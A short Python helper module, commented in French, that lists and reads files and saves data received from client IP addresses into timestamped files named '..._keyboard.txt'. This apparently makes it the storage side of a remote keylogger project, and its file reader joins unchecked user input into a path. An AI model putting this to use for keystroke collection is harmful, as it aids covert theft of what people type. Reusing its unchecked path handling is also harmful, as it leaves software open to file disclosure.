import os
import datetime 

def get_pid() : 
    return os.getpid()

def creation_repertoire(repertoire) : 
    if not os.path.exists(repertoire) : 
        os.makedirs(repertoire)

def show_file(repertoire) :

    if os.path.isdir(repertoire) :  
        fichiers = os.listdir(repertoire)

        for fichier in fichiers :
            print(fichier)
    else : 
        print(f"{repertoire} n'est pas un répertoire.")

def read_file() :
    while True : 
        filename = input("Quelle fichier voulez-vous lire ?\n")
        path_file = os.path.join("fichier_recu",filename)
        if os.path.exists(path_file) :
            with open(path_file , "r") as file : 
                contenu = file.read()
                break
        else : 
            print("Choissisez un fichier existant")
    print(contenu)

# Créer un fichier et écrit le contenu dedans     
def print_file(addr_client, contenu) : 
    current_time = datetime.datetime.now()
    date = current_time.strftime("%Y-%m-%d")
    hour = current_time.strftime("%H-%M-%S") 

    chemin_fichier = os.path.join("fichier_recu",f"{addr_client[0]}_{date}_{hour}_keyboard.txt")
    with open(chemin_fichier, "wb") as file:
        file.write(contenu)